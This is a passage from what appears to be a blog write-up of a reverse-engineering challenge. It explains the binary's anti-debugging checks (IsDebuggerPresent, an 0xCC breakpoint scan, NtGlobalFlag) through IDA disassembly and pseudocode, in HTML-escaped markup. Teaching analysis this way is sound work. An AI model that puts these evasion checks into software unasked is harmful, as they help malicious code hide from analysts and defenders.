&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401350&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4013F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401460&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-11.jpg&#34; alt=&#34;0xCC Check&#34; title=&#34;0xCC Check&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Offsets from two functions are loaded and then compared. The first one calls &lt;code&gt;isDebuggerPresent&lt;/code&gt; and the second one just prints something and exits. We have seen this function before, it is the first check.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;calls_isDebuggerPresent&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;01030&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;calls_isDebuggerPresent&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;proc&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;near&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401030&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401031&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;IsDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401037&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob_length&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040103&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040103&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;test&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401041&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jz&lt;/span&gt;      &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_401079&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;sub_401780&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401780&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401780&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;proc&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;near&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401780&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401780&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;arg_0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt;  &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401780&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401780&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401781&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401783&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;arg_0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401786&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401787&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aBmoChopD&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;BMO Chop! [%d]\n&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040178&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_printf&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401791&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401794&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;0FFFFDCD7h&lt;/span&gt;      &lt;span style=&#34;color: #586E75&#34;&gt;; uExitCode&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401799&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ExitProcess&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401799&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401780&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;endp&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;None of these functions are called. But their offsets are compared. If offset of &lt;code&gt;calls_isDebuggerPresent&lt;/code&gt; is larger than &lt;code&gt;sub_401780&lt;/code&gt; then we jump down and string &lt;code&gt;I can haz decode?&lt;/code&gt; is xor-ed with the blob. Otherwise we go right. &lt;strong&gt;I am not quite sure what this check is for&lt;/strong&gt;. I think it is trying to find if calls to &lt;code&gt;isDebuggerPresent&lt;/code&gt; are redirected or not (by the debugger?) as the address of the first function is &lt;code&gt;0x401030&lt;/code&gt; and is smaller than &lt;code&gt;0x401780&lt;/code&gt;. If you know what this means please let me know and I will update this section. In all of my runs the jump does not happen and execution continues to the right.&lt;/p&gt;

&lt;p&gt;To the right we can see a pretty standard &lt;code&gt;0xCC&lt;/code&gt; check. &lt;code&gt;0xCC&lt;/code&gt; is the code for &lt;code&gt;INT 3&lt;/code&gt; and is used by debuggers to set breakpoints. It is simply checking if &lt;code&gt;0xCC&lt;/code&gt; bytes are present in the function code. If &lt;code&gt;0xCC&lt;/code&gt; is present &lt;code&gt;ecx&lt;/code&gt; is increased by 2, otherwise by one. In the end this number is compared with &lt;code&gt;0x55&lt;/code&gt;. If the check does not pass it will jump to left (same as above) and &lt;code&gt;I can haz decode?&lt;/code&gt; is xor-ed with the blob. If the number is &lt;code&gt;0x55&lt;/code&gt; string &lt;code&gt;Such fire. Much burn. Wow.&lt;/code&gt; is xor-ed with the blob.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;ICanHaz?&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(calls_isDebuggerPresent&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;sub_401780&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;address)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(calls_isDebuggerPresent&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;has0xCC&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;True&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;I can haz decode?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Such fire. Much burn. Wow.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-7-ntglobalflag:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 7 - NtGlobalFlag&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;VMware_detection&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;Electric_Boogaloo&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;OutputDebugString&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;ICanHaz?&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4013F0&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401460&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;This one is pretty straightforward. A field inside the &lt;code&gt;PEB&lt;/code&gt; (we have already seen it) is called &lt;code&gt;NtGlobalFlag&lt;/code&gt;. This flag is at offset &lt;code&gt;0x68&lt;/code&gt; in 32-bit versions of Windows (and &lt;code&gt;0xBC&lt;/code&gt; for 64-bit). Usually it is set to zero but it can be changed. A process that is started by a debugger will have this field set to &lt;code&gt;0x70&lt;/code&gt;. To read more about it, please look at the &lt;a href=&#34;http://pferrie.host22.com/papers/antidebug.pdf&#34; target=&#34;_blank&#34;&gt;Anti-Debugging&lt;/a&gt; reference.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-12.jpg&#34; alt=&#34;&amp;quot;NtGlobalFlag Checked&amp;quot;&#34; title=&#34;NtGlobalFlag Checked&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If &lt;code&gt;NtGlobalFlag&lt;/code&gt; is not &lt;code&gt;0x70&lt;/code&gt; then &lt;code&gt;\x09\x00\x00\x01&lt;/code&gt; will be xor-ed with the blob, otherwise &lt;code&gt;Feel the sting of the monarch!&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;NtGlobalFlag&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(NtGlobalFlag&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Feel the sting of the monarch!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
    
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\x09\x00\x00\x01&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-8-sands-of-time:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 8 - Sands of Time&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;VMware_detection&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;Electric_Boogaloo&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;OutputDebugString&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;ICanHaz?&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;NtGlobalFlag&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401460&lt;/span&gt;     &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
